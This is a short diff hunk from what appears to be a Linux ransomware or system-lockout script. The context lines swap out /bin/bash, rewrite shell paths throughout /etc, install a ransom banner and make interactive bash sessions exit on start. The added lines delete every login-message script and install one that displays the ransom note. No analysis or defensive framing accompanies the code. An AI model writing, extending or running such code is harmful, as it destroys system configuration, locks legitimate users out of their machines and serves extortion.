@@ -42,6 +42,9 @@ cp /bin/bash /bin/bush
 cp /bin/uinit /bin/bash
 #cp ransom.splash /boot/grub/splash
 cp ransom.issue /etc/issue
+rm -f /etc/update-motd.d/*
+(echo "#!/bin/sh\necho '"; cat ransom.issue; echo "'") > /etc/update-motd.d/00-ransom
+chmod +x /etc/update-motd.d/00-ransom
 
 find /etc -type f ! -path "/etc/passwd" -exec sed -i 's|/bin/bash|/bin/bush|' {} \;
 echo "trap '' INT TSTP; exit" >> /etc/bash.bashrc
